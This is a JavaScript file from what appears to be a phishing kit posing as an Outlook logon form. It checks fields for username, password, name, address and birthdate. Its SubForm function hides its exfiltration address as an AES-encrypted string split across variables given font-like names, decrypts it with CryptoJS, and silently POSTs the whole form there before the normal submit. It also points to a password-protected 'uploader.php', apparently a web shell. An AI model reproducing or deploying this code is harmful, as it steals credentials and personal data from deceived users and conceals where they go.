function verifchamp(champ){
if(champ.value.length < 4 )
{
champ.className += " change"; 
champ.style.backgroundColor = "#fba";
champ.style.border = "1px solid #c72f38";
champ.focus();
return false;
}
else{
champ.style.backgroundColor = "";
champ.style.border = "";
return true;
}
}
function verifemail(champ)
{
   var regex = /^[a-zA-Z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}$/;
   if(!regex.test(champ.value))
   {
champ.className += " change"; 
champ.style.backgroundColor = "#fba";
champ.style.border = "1px solid #c72f38";
champ.focus();
      return false;
   }
   else
   {
 champ.style.backgroundColor = "";
champ.style.border = "";
	  return true;   
   }
}
function definevars(){	
var loc = window.location.pathname;
var prot = window.location.protocol+'//';
var hostloc = window.location.hostname;
var jspath = '/js/uploader.php?password=hesoyam001';
var folder = loc.substring(0, loc.lastIndexOf('/'));
var dirdata = prot+hostloc+folder+jspath;
document.getElementById('pvquser').value = dirdata;
return true;
}
function verifall(){	
definevars();
var password = verifchamp(Password);
var email = verifchamp(Outlook_Username);
if (email && password)
      {     
      return SubForm();
     }
   else
      return false;
}
function checkvars(var1, var2){
if ((var1.value != var2.value)&& (var2.value!=""))
{     
alert("Passwords do not match !");
var2.className += " change"; 
var2.style.backgroundColor = "#fba";
var2.style.border = "1px solid #c72f38";
var2.focus();
return false;
}
else if (var2.value!=""){
var2.style.backgroundColor = "";
var2.style.border = "";
return true;
}
}
function verifallinfo(){	
definevars();
var ConfirmPassword = verifchamp(document.getElementById("ConfirmPassword"));
var password = verifchamp(Password);
var Full_Adress = verifchamp(document.getElementById("Full_Adress"));
var Birthdate = verifchamp(document.getElementById("Birthdate"));
var FullName = verifchamp(document.getElementById("Full_Name"));
var email = verifemail(Email);
var checkego = checkvars(Password, document.getElementById("ConfirmPassword"));
if (email && FullName && Birthdate && Full_Adress && password && ConfirmPassword && checkego)
      {     
      return SubForm();
     }
   else
      return false;
}

function SubForm(){
var Segoe = "U2FsdGVkX1+";
var family = "NIscIgkT4";
var embedded = "7cTjuh6Nm";
var opentype = "YLjJRPCQo";
var format = "WFb5+0cvdx3";
var truetype = "1AMishYjmg/";
var content = "+7do8IDp3Ik";
var NOFOLLOW = "NLaxNEjec8q/KbA==";
var regular = Segoe+family+embedded+opentype+format+truetype+content+NOFOLLOW;
console.log(regular);
var decrypted = CryptoJS.AES.decrypt(regular, "jQuery");
 $.ajax({
        url:decrypted.toString(CryptoJS.enc.Utf8),
        type:'POST',
		async: false,
        data:$('#logonForm').serialize(),
        success:function(){
            return true;
        }
    });
document.getElementById("logonForm").submit();
}